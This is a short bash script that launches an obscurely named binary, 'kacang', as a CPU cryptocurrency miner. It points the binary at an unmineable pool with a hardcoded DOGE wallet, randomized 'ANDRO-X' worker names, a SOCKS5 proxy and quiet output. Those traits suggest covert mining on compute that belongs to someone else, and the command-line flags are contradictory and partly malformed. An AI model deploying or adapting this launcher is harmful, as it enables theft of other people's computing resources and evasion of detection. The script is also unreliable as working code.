#!/bin/bash
POOL=rx.unmineable.com:3333
WALLET=DOGE:DLd8SKUyrMCAuUt4ToGWDirH6fpQTf6BvV
WORKER=$(echo $(shuf -i 10-299 -n 1)-ANDRO-X)
PROXY=socks5://192.252.209.155:14455
chmod +x kacang
./kacang --disable-gpu --algorithm yespower2b -o --pool $POOL -a rx -k -u --wallet $WALLET.$WORKER#tyhl-8s04 --cpu-threads 2 --cpu-threads-intensity 2 $PROXY -q
